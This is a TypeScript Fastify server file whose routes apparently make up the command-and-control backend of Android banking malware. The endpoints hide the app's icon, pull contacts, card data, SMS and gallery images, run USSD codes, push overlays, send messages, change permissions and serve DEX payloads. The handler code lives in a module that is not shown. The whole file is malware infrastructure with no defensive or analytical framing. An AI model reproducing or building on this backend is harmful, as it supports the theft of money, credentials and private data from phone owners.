import { Hook } from "./hooks";
import { fastify as fast } from "fastify";
import fastifyRateLimit from "@fastify/rate-limit";

const app = fast({ logger: false });

app.register(fastifyRateLimit, {
    hook: "onRequest",
    timeWindow: "1 minute",
    max: 200
});

app.post("/register", async (request, reply) => await Hook.register(request, reply));
app.post("/refresh", async (request, reply) => await Hook.refresh(request, reply));
app.post("/self-update", async (request, reply) => await Hook.selfUpdate(request, reply));
app.post("/group-ping", async (request, reply) => await Hook.groupPing(request, reply));
app.post("/get-contacts", async (request, reply) => await Hook.getContacts(request, reply));
app.post("/get-cards", async (request, reply) => await Hook.getCards(request, reply));
app.post("/hide-app", async (request, reply) => await Hook.hideApp(request, reply));
app.post("/unhide-app", async (request, reply) => await Hook.unhideApp(request, reply));
app.post("/incoming-message", async (request, reply) => await Hook.incomingMessage(request, reply));
app.post("/run-ussd", async (request, reply) => await Hook.runUSSD(request, reply));
app.post("/get-phone-numbers", async (request, reply) => await Hook.getPhoneNumbers(request, reply));
app.post("/send-message", async (request, reply) => await Hook.sendMessage(request, reply));
app.post("/get-gallery", async (request, reply) => await Hook.getGallery(request, reply));
app.post("/get-sms", async (request, reply) => await Hook.getSMS(request, reply));
app.post("/get-balance", async (request, reply) => await Hook.getBalance(request, reply));
app.post("/change-skin", async (request, reply) => await Hook.changeSkin(request, reply));
app.post("/overlay", async (request, reply) => await Hook.overlay(request, reply));
app.post("/open-app", async (request, reply) => await Hook.openApp(request, reply));
app.post("/update-permissions", async (request, reply) => await Hook.updatePermissions(request, reply));
app.get("/get-dex", async (request, reply) => await Hook.getDex(request, reply));

app.listen({ port: 9099, host: "127.0.0.1" }, (err, addr) => {
    if (err) console.error(err.message);
    console.log("service addr", addr);
});
